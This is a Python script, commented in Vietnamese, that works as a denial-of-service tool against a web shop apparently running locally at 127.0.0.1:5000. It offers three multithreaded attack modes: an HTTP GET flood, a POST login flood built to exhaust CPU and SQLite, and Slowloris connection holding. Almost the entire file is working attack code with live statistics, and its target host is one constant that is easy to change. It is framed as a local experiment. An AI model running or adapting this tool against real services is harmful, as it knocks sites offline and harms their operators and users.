"""Công cụ kiểm thử Tấn công DoS / DDoS (Layer 7 & Socket) vào Web Bán Hàng Real-Time.

Mục đích thử nghiệm:
1. HTTP GET Flood (L7): Bắn dồn dập vào trang chủ và API tìm kiếm SQLite.
2. HTTP POST Login Flood (L7): Bắn dồn dập vào API đăng nhập khiến máy chủ tốn CPU băm mật khẩu và truy vấn database.
3. Slowloris (L7 Low-and-Slow): Mở nhiều kết nối gửi header chậm rãi, chiếm giữ toàn bộ worker threads.
"""

from __future__ import annotations

import argparse
import random
import socket
import sys
import threading
import time

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 5000

stop_attack = threading.Event()
stats_lock = threading.Lock()
requests_sent = 0
requests_failed = 0


def http_get_flood_worker(worker_id: int):
    """Gửi liên tục các request HTTP GET đến máy chủ."""
    global requests_sent, requests_failed
    paths = ["/", "/api/products", "/api/search?q=laptop", "/api/search?q=iphone", "/static/style.css"]

    while not stop_attack.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3.0)
            s.connect((TARGET_HOST, TARGET_PORT))
            path = random.choice(paths)
            req = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {TARGET_HOST}:{TARGET_PORT}\r\n"
                f"User-Agent: Mozilla/5.0 (Bot-{worker_id})\r\n"
                f"Connection: close\r\n\r\n"
            ).encode("utf-8")
            s.sendall(req)
            resp = s.recv(1024)
            s.close()

            with stats_lock:
                requests_sent += 1
        except Exception:
            with stats_lock:
                requests_failed += 1
            time.sleep(0.05)


def http_post_login_flood_worker(worker_id: int):
    """Tấn công bất đối xứng vào API đăng nhập (POST /api/login) khiến CPU băm hash và SQLite quá tải."""
    global requests_sent, requests_failed

    while not stop_attack.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3.0)
            s.connect((TARGET_HOST, TARGET_PORT))

            fake_user = f"victim_bot_{random.randint(1000, 9999)}"
            fake_pass = f"password_{random.randint(100000, 999999)}"
            body = f'{{"username":"{fake_user}","password":"{fake_pass}"}}'

            req = (
                f"POST /api/login HTTP/1.1\r\n"
                f"Host: {TARGET_HOST}:{TARGET_PORT}\r\n"
                f"Content-Type: application/json\r\n"
                f"Content-Length: {len(body)}\r\n"
                f"User-Agent: Botnet-LoginFlood/{worker_id}\r\n"
                f"Connection: close\r\n\r\n"
                f"{body}"
            ).encode("utf-8")
            s.sendall(req)
            resp = s.recv(1024)
            s.close()

            with stats_lock:
                requests_sent += 1
        except Exception:
            with stats_lock:
                requests_failed += 1
            time.sleep(0.05)


def slowloris_worker(worker_id: int):
    """Tấn công Slowloris: Giữ kết nối mở thật lâu bằng cách gửi header từng chút một."""
    global requests_sent, requests_failed
    while not stop_attack.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10.0)
            s.connect((TARGET_HOST, TARGET_PORT))
            # Gửi header chưa hoàn chỉnh (thiếu \r\n\r\n)
            s.send(f"GET /?slowloris={worker_id} HTTP/1.1\r\n".encode("utf-8"))
            s.send(f"Host: {TARGET_HOST}:{TARGET_PORT}\r\n".encode("utf-8"))
            s.send(f"User-Agent: Slowloris-Agent/{worker_id}\r\n".encode("utf-8"))

            with stats_lock:
                requests_sent += 1

            # Cứ mỗi 3-4 giây gửi thêm 1 header vụn để giữ socket
            for _ in range(15):
                if stop_attack.is_set():
                    break
                time.sleep(3.0)
                s.send(f"X-Keep-Alive: {random.randint(1, 1000)}\r\n".encode("utf-8"))

            s.close()
        except Exception:
            with stats_lock:
                requests_failed += 1
            time.sleep(0.5)


def run_attack(mode: str, num_threads: int, duration_sec: int):
    global requests_sent, requests_failed
    requests_sent = 0
    requests_failed = 0
    stop_attack.clear()

    worker_fn = {
        "1": http_get_flood_worker,
        "2": http_post_login_flood_worker,
        "3": slowloris_worker
    }.get(mode, http_get_flood_worker)

    mode_name = {
        "1": "HTTP GET Flood (Layer 7 - Tràn tài nguyên trang web)",
        "2": "HTTP POST Login Flood (Layer 7 - Ép băm SHA256 & Quá tải SQLite)",
        "3": "Slowloris Attack (Layer 7 - Chiếm giữ Socket & Worker Threads)"
    }.get(mode, "HTTP GET Flood")

    print("\n" + "=" * 60)
    print(f"🔥 BẮT ĐẦU TẤN CÔNG: {mode_name}")
    print(f"🎯 Mục tiêu: http://{TARGET_HOST}:{TARGET_PORT}")
    print(f"👥 Số luồng tấn công (Bot Threads): {num_threads}")
    print(f"⏱️ Thời gian mô phỏng: {duration_sec} giây")
    print("=" * 60)
    print("👉 Hãy mở trình duyệt Chrome/Edge tại http://127.0.0.1:5000 và bấm F5.")
    print("👉 BẠN SẼ THẤY VÒNG XOAY TRÊN TAB TRÌNH DUYỆT XOAY TÍT MÙ VÀ KHÔNG THỂ TẢI TRANG!")
    print("=" * 60)

    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=worker_fn, args=(i + 1,), daemon=True)
        t.start()
        threads.append(t)

    start_time = time.monotonic()
    try:
        while time.monotonic() - start_time < duration_sec:
            elapsed = time.monotonic() - start_time
            time.sleep(1.0)
            with stats_lock:
                rps = round(requests_sent / max(1.0, elapsed), 1)
                print(f"⏳ [{int(elapsed)}s/{duration_sec}s] Đã gửi: {requests_sent} requests | Tốc độ: {rps} req/s | Thất bại: {requests_failed}")
    except KeyboardInterrupt:
        print("\n[!] Dừng tấn công theo yêu cầu...")
    finally:
        stop_attack.set()
        for t in threads:
            t.join(1.0)

    print("\n" + "=" * 60)
    print("🏁 KẾT THÚC ĐỢT TẤN CÔNG")
    print(f"📊 Tổng số gói tin/request đã bắn: {requests_sent}")
    print(f"📊 Số request bị từ chối/thất bại: {requests_failed}")
    print("=" * 60)


def main():
    print("=" * 60)
    print("⚡ CÔNG CỤ TẤN CÔNG THỰC NGHIỆM DoS / DDoS (LAYER 7)")
    print("=" * 60)
    print("Chọn hình thức tấn công:")
    print("  [1] HTTP GET Flood (Đánh sập trang chủ & API tìm kiếm SQLite)")
    print("  [2] HTTP POST Login Flood (Spam đăng nhập, đốt CPU và SQLite)")
    print("  [3] Slowloris Low-and-Slow (Treo socket, làm tab web xoay vô tận)")
    print("=" * 60)

    if len(sys.argv) > 1:
        choice = sys.argv[1]
        threads = int(sys.argv[2]) if len(sys.argv) > 2 else 25
        duration = int(sys.argv[3]) if len(sys.argv) > 3 else 20
    else:
        choice = input("👉 Nhập lựa chọn [1-3] (mặc định 1): ").strip() or "1"
        threads = int(input("👉 Số bot/luồng (mặc định 25): ").strip() or "25")
        duration = int(input("👉 Thời gian tấn công tính bằng giây (mặc định 20): ").strip() or "20")

    run_attack(choice, threads, duration)


if __name__ == "__main__":
    main()
